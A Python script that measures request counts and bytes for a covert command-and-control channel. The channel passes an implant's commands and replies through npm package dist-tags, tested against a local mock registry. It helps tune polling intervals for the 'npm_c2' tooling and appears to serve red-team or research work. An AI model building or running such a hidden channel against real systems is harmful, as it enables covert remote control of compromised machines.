#!/usr/bin/env python3
"""Measure what one command actually costs over the wire.

Counts every HTTP request and byte the implant plus operator send, so the
polling interval can be chosen from numbers instead of taste.
"""
import json
import os
import sys
import time
import base64

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "src"))
sys.path.insert(0, HERE)

from mock_registry import Registry, serve                          # noqa: E402
import npm_c2                                                      # noqa: E402
from npm_c2.operator import Operator                               # noqa: E402
from npm_c2.crypto import derive_key, seal                         # noqa: E402
from npm_c2 import encode_payload, CMD_PREFIX, RES_PREFIX          # noqa: E402

PKG = "example-pkg"
PASS = "cost-measure-passphrase"
TOKEN = "npm_token"

reg = Registry()
srv, base = serve(reg, auth_token=TOKEN)
npm_c2.API_BASE = base
npm_c2.API = base + "/-/package/{}/dist-tags"

enc = Operator(PKG, TOKEN, passphrase=PASS)
key = derive_key(PASS)

# --- how many tags does one command take, plaintext vs sealed?
for label, plain in (("plaintext", b"whoami"),
                     ("sealed", seal(key, b"whoami", PKG.encode()))):
    tags = encode_payload(plain, CMD_PREFIX)
    print(f"{label:10} 'whoami' -> {len(tags)} tag(s), "
          f"{len(plain)} bytes payload")

big_out = b"A" * 2000
print(f"{'sealed':10} 2KB reply -> "
      f"{len(encode_payload(seal(key, big_out, PKG.encode()), RES_PREFIX))} tag(s)")

# --- count the HTTP cost of one push
before = len(reg.writes), reg.gets
enc.push_task("echo cost", quiet=True)
writes, gets = len(reg.writes) - before[0], reg.gets - before[1]
print(f"\none command push : {writes} PUT, {gets} GET")

# --- cost of one poll with an empty channel
before = len(reg.writes), reg.gets
tags = enc._fetch()
writes, gets = len(reg.writes) - before[0], reg.gets - before[1]
payload = json.dumps(tags).encode()
print(f"one idle poll    : {writes} PUT, {gets} GET, ~{len(payload)} bytes back")

# --- how the poll cost grows as tags accumulate (npm cannot delete them)
print("\ntags in map   bytes per poll   vs empty")
base_bytes = len(json.dumps(dict.fromkeys([])).encode())
for n in (0, 10, 50, 100, 200):
    for i in range(n - (0 if n == 0 else 0)):
        pass
    scale = dict.fromkeys(
        [f"x64-{i:04x}-0101_ZWNobyBSRU1PVEUtQ0hBTk5FTC1XT1JLUw" for i in range(n)],
        "1.0.0")
    size = len(json.dumps(scale).encode())
    print(f"{n:>10}   {size:>12}   {size / 622:.1f}x")

# --- daily request budget at common intervals
print("\ninterval   polls/day   GET/day   MB/day")
for interval in (10, 30, 60, 300, 600, 1800):
    polls = 86400 // interval
    mb = polls * 1613 / 1_000_000     # measured 62-tag poll
    print(f"{interval:>6}s   {polls:>9}   {polls:>7}   {mb:>6.2f}")

print("\nnote: every poll is a full 1.6KB GET at 62 tags, and npm offers no")
print("ETag/304 on the dist-tags route, so there is no way to make one cheaper.")
